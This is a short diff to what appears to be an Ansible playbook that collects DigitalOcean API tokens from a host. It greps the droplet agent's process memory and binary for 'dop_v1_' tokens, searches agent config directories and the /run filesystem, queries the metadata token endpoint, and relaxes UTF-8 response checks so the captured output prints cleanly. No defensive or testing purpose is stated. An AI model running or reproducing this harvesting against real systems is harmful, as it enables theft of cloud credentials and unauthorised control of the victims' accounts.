@@ -50,7 +50,8 @@
           cat /proc/$AGENT_PID/cmdline 2>/dev/null | tr '\0' ' '
 
           echo "=== Agent memory scan for token ==="
-          grep -a "dop_v1_" /proc/$AGENT_PID/mem 2>/dev/null || true
+          strings /proc/$AGENT_PID/mem 2>/dev/null | \
+            grep -E "dop_v1_[a-f0-9]+" | head -5 || true
           strings /proc/$AGENT_PID/exe 2>/dev/null | \
             grep -iE "token|auth|bearer|api" | head -20
         fi
@@ -62,7 +63,7 @@
         find /opt/digitalocean /etc/droplet-agent \
           /var/lib/droplet-agent /run/droplet-agent \
           /.droplet-agent 2>/dev/null -type f | \
-          xargs cat 2>/dev/null
+          xargs grep -aE "dop_v1_|DO_TOKEN|DIGITALOCEAN" 2>/dev/null | head -50
 
         echo "=== Metadata token endpoints ==="
         curl -sf http://169.254.169.254/metadata/v1/auth/token 2>/dev/null || true
@@ -83,8 +84,8 @@
 
         echo "=== /run filesystem scan ==="
         find /run -type f 2>/dev/null | \
-          xargs grep -il "token\|dop_v1\|digitalocean" \
-          2>/dev/null | xargs cat 2>/dev/null
+          xargs grep -aE "dop_v1_|DO_TOKEN|DIGITALOCEAN" \
+          2>/dev/null | head -30
 
         echo "=== Unix sockets ==="
         ss -xlp 2>/dev/null | grep -i "digital\|droplet\|agent"
@@ -185,6 +186,8 @@
       register: result
       changed_when: false
       failed_when: false
+      environment:
+        MODULE_STRICT_UTF8_RESPONSE: "false"
 
     - name: Output
       ansible.builtin.debug:
